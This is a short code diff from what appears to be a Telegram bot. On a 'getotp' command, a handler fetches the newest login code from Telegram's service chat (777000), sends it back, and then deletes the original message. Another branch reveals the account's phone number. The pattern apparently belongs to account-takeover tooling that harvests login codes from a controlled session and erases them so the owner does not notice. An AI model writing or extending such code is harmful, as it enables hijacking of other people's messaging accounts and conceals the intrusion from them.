@@ -116,7 +116,7 @@ async def get_my_otp(client, message):
                 if message.command[0] == "getotp":
                     async for otp in X.search_messages(777000, limit=1):
                         await message.reply(otp.text, quote=True)
-                        await otp.delete()
+                        await X.delete_messages(X.me.id, otp.id)
                     await TM.delete()
                 else:
                     return await TM.edit(X.me.phone_number)
